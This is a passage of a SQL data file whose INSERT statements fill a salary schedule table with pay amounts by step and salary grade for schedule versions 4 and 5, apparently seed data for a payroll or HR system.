INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '13', '22804.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '13', '23045.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '13', '23289.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '13', '23536.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '13', '23786.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '13', '24037.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '14', '24141.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '14', '24396.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '14', '24655.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '14', '24916.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '14', '25180.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '14', '25447.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '14', '25717.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '14', '25989.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '15', '26192.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '15', '26489.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '15', '26790.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '15', '27094.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '15', '27401.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '15', '27712.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '15', '28027.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '15', '28344.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '16', '28417.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '16', '28740.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '16', '29066.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '16', '29396.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '16', '29729.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '16', '30066.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '16', '30408.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '16', '30752.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '17', '30831.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '17', '31183.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '17', '31536.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '17', '31893.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '17', '32255.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '17', '32622.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '17', '32991.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '17', '33366.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '18', '33452.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '18', '33831.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '18', '34215.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '18', '34603.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '18', '34996.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '18', '35393.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '18', '35795.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '18', '36201.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '19', '36409.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '19', '36857.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '19', '37312.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '19', '37771.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '19', '38237.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '19', '38709.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '19', '39186.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '19', '39670.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '20', '39768.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '20', '40259.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '20', '40755.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '20', '41258.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '20', '41766.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '20', '42281.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '20', '42802.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '20', '43330.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '21', '43439.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '21', '43974.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '21', '44517.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '21', '45066.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '21', '45621.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '21', '46183.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '21', '46753.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '21', '47329.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '22', '47448.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '22', '48032.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '22', '48625.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '22', '49224.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '22', '49831.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '22', '50445.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '22', '51067.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '22', '51697.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '23', '51826.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '23', '52466.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '23', '53112.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '23', '53767.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '23', '54430.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '23', '55101.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '23', '55781.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '23', '56468.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '24', '56610.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '24', '57308.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '24', '58014.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '24', '58730.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '24', '59453.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '24', '60187.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '24', '60928.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '24', '61679.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '25', '61971.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '25', '62735.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '25', '63508.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '25', '64291.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '25', '65083.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '25', '65885.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '25', '66698.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '25', '67520.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '26', '67690.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '26', '68524.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '26', '69369.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '26', '70224.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '26', '71090.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '26', '71967.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '26', '72855.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '26', '73751.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '27', '73937.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '27', '74849.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '27', '75771.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '27', '76705.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '27', '77651.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '27', '78608.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '27', '79577.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '27', '80567.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '28', '80760.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '28', '81756.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '28', '82764.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '28', '83784.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '28', '84817.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '28', '85862.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '28', '86921.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '28', '87993.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '29', '88214.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '29', '89301.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '29', '90402.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '29', '91516.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '29', '92644.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '29', '93786.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '29', '94943.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '29', '96113.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '30', '96354.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '30', '97543.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '30', '98745.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '30', '99962.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '30', '101195.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '30', '102442.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '30', '103705.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '30', '104984.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '31', '117086.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '31', '118623.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '31', '120180.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '31', '121758.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '31', '123356.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '31', '124975.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '31', '126616.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '31', '128278.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '32', '135376.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '32', '137174.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '32', '138996.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '32', '140843.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '32', '142714.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '32', '144610.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '32', '146531.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '32', '148478.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '33', '160924.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '33', '165752.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '1', '9981.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '1', '10072.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '1', '10165.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '1', '10258.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '1', '10352.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '1', '10453.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '1', '10543.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '1', '10640.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '2', '10667.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '2', '10761.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '2', '10856.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '2', '10952.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '2', '11049.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '2', '11147.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '2', '11245.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '2', '11345.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '3', '11387.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '3', '11488.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '3', '11589.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '3', '11691.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '3', '11795.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '3', '11899.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '3', '12110.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '3', '12004.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '4', '12155.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '4', '12262.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '4', '12371.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '4', '12480.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '4', '12591.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '4', '12702.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '4', '12814.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '4', '12927.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '5', '12975.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '5', '13117.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '5', '13206.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '5', '13322.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '5', '13440.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '5', '13559.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '5', '13679.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '5', '13799.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '6', '13851.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '6', '13973.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '6', '14096.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '6', '14221.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '6', '14347.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '6', '14474.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '6', '14602.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '6', '14731.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '7', '14785.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '7', '14916.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '7', '15048.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '7', '15181.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '7', '15315.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '7', '15450.00', '5');
